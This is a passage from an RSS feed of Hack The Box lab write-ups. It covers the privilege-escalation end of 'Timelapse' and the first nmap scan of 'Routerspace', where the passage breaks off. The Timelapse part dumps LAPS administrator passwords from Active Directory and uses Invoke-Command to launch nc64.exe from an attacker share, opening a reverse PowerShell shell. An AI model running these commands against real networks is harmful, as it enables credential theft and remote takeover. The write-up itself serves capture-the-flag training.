font-style: inherit;">Sort-Object</span> ms-Mcs-AdmPwdExpirationTime <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Format-Table</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>AutoSize Name<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> DnsHostName<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> ms-Mcs-AdmPwd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> ms-Mcs-AdmPwdExpirationTime</span>
<span id="cb17-4"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$computers</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Export-Csv</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>path c<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\users\danny\desktop\<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"LAPS-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">$((</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Get-Date</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">.ToString("</span>MM-dd-yyyy<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">")).csv"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>NoTypeInformation</span></code></pre></div>
<p>Run the script:</p>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb18-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\svc_deploy\Desktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">./</span>laps<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ps1</span></span>
<span id="cb18-2"></span>
<span id="cb18-3">Name  DnsHostName        ms-Mcs-AdmPwd            ms-Mcs-AdmPwdExpirationTime</span>
<span id="cb18-4"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span>  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-----------</span>        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-------------</span>            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">---------------------------</span></span>
<span id="cb18-5">WEB01                                                                        </span>
<span id="cb18-6">DEV01                                                                        </span>
<span id="cb18-7">DB01                                                                         </span>
<span id="cb18-8">DC01  dc01<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">timelapse</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">htb</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">6</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span>e<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>2G<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span>L<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span>TK5<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span>eGy<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%</span>gJ8s<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>2X <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">132936070633235489</span></span></code></pre></div>
<p>A new set of creds: <code>Administrator:6+e(2G,L;TK5+eGy%gJ8s.2X</code></p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb19-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\svc_deploy\Desktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$so</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">New-PSSessionOption</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SkipCACheck <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SkipCNCheck <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SkipRevocationCheck</span>
<span id="cb19-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\svc_deploy\Desktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$p</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ConvertTo-SecureString</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'6+e(2G,L;TK5+eGy%gJ8s.2X'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>AsPlainText <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Force</span>
<span id="cb19-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\svc_deploy\Desktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$c</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">New-Object</span> System<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Management</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Automation</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PSCredential</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Administrator'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$p</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb19-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\svc_deploy\Desktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">invoke-command</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>computername localhost <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>credential <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$c</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>port <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">5986</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>usessl <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SessionOption <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$so</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>scriptblock <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span>whoami<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb19-5">timelapse\administrator</span>
<span id="cb19-6"></span>
<span id="cb19-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\svc_deploy\Desktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">invoke-command</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>computername localhost <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>credential <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$c</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>port <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">5986</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>usessl <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SessionOption <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$so</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>scriptblock <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{//</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">14.2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>share<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>nc64<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">14.2</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4499</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>e powershell<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb19-8"></span>
<span id="cb19-9">➜  timelapse rlwrap nc <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>lvnp <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4499</span></span>
<span id="cb19-10"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">listening</span> on <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span>any<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4499</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span></span>
<span id="cb19-11">connect to <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10.14.2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">from</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>UNKNOWN<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10.11.152</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">64806</span></span>
<span id="cb19-12"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">Windows</span> PowerShell </span>
<span id="cb19-13">Copyright <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> Microsoft Corporation<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span> All rights reserved<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb19-14"></span>
<span id="cb19-15"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\Administrator\Documents<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami</span>
<span id="cb19-16">timelapse\administrator</span></code></pre></div>
<hr>
</section>
<section id="step-4" class="level3">
<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
<p>The flag, <code>root.txt</code>, is not in it’s normal directory (<code>C:\Users\Administrator\Desktop\root.txt</code>). Looking around we find the flag in user <code>TRX</code> directory.</p>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb20-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\TRX\Desktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">type</span> root<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">txt</span></span>
<span id="cb20-2">5f0405eed578c041a6f9ad86d0318e82</span></code></pre></div>
<hr>
</section>
</section>
<section id="references" class="level1">
<h1>References</h1>
<p><strong>.pfx to .key &amp; .crt:</strong> https://medium.com/beingcoders/easy-way-to-convert-pfx-to-crt-key-files-in-10-minutes-683849242c65</p>


</section>

 ]]></description>
  <category>hackthebox</category>
  <category>easy</category>
  <category>windows</category>
  <category>smb</category>
  <category>pfx</category>
  <guid>https://exploit.se/posts/2022-04-01-htb-writeup-timelapse/2022-04-01-htb-writeup-timelapse.html</guid>
  <pubDate>Fri, 01 Apr 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-04-01-htb-writeup-timelapse/images/timelapse_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Routerspace - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-03-28-htb-writeup-routerspace/2022-03-28-htb-writeup-routerspace.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">┌──</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">void㉿void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-[/htb/routerspace]</span></span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">└─$</span> nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.10.11.148     </span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh</span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http</span>
<span id="cb1-6"></span>
<span id="cb1-7"></span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">┌──</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">void㉿void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-[/htb/routerspace]</span></span>
<span id="cb1-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">└─$</span> nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p22,80</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> 10.10.11.148</span>
<span id="cb1-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Starting</span> Nmap 7.91 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">https://nmap.org</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> 2022-03-28 09:22 CEST</span>
<span id="cb1-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE VERSION</span>
<span id="cb1-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh     <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fingerprint-strings:</span> </span>
<span id="cb1-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NULL:</span> </span>
<span id="cb1-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>    SSH-2.0-RouterSpace Packet Filtering V1</span>
<span id="cb1-16"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-17"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3072</span> f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-18"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-19"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http</span>
<span id="cb1-21"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fingerprint-strings:</span> </span>
<span id="cb1-22"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">FourOhFourRequest:</span> </span>
<span id="cb1-23"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HTTP/1.1</span> 200 OK</span>
<span id="cb1-24"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">X-Powered-By:</span> RouterSpace</span>
<span id="cb1-25"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">X-Cdn:</span> RouterSpace-77288</span>
<span id="cb1-26"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Type:</span> text/html<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">charset</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>utf-8</span>
<span id="cb1-27"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Length:</span> 70</span>
<span id="cb1-28"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ETag:</span> W/<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"46-abbFyEBeXh9CSfIO4E5mGzrEQI0"</span></span>
<span id="cb1-29"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Date:</span> Mon, 28 Mar 2022 07:24:55 GMT</span>
<span id="cb1-30"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Connection:</span> close</span>
<span id="cb1-31"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Suspicious</span> activity detected !!! {RequestID: zLw qUksX fN OW A }</span>
<span id="cb1-32"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GetRequest:</span> </span>
<span id="cb1-33"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HTTP/1.1</span> 200 OK</span>
<span id="cb1-34"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">X-Powered-By:</span> RouterSpace</span>
<span id="cb1-35"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">X-Cdn:</span> RouterSpace-62862</span>
<span id="cb1-36"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Accept-Ranges:</span> bytes</span>
<span id="cb1-37"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Cache-Control:</span> public, max-age=0</span>
<span id="cb1-38"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Last-Modified:</span> Mon, 22 Nov 2021 11:33:57 GMT</span>
<span id="cb1-39"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ETag:</span> W/<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"652c-17d476c9285"</span></span>
<span id="cb1-40"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Type:</span> text/html<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">charset</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>UTF-8</span>
<span id="cb1-41"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Length:</span> 25900</span>
<span id="cb1-42"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Date:</span> Mon, 28 Mar 2022 07:24:54 GMT</span>
<span id="cb1-43"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Connection:</span> close</span>
<span id="cb1-44"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!doctype <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">html</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-45"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>html <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"no-js"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">lang</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"zxx"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-46"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>head<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-47"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>meta <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">charset</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"utf-8"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-48"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>meta <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http-equiv=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"x-ua-compatible"</span> content=<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ie=edge"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-49"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>title<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>RouterSpace<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/title<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-50"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>meta <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">name</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"description"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">content</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
